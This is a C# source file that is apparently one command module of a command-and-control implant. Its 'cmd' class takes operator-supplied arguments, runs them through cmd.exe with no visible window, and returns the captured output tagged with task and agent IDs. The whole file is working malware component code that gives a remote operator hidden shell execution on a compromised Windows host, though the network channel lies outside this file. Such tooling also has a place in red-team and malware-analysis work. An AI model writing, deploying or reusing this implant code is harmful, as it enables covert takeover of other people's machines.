using Implant.Models;
using System.Diagnostics;
using System.Text;

namespace Implant.Commands
{
    public class CmdCommand : Command
    {
        public override string Name => "cmd";

        public override AgentTaskResult Execute(string taskId ,string agentId, string arguments)
        {
            Process process = new Process();
            
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C " + arguments;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();

            StringBuilder output = new StringBuilder();
            while (!process.StandardOutput.EndOfStream)
            {
                string line = process.StandardOutput.ReadLine();
                output.AppendLine(line);
            }

            return new AgentTaskResult
            {
                AgentId = agentId,
                Result = output.ToString(),
                TaskId = taskId
            };
        }
    }
}
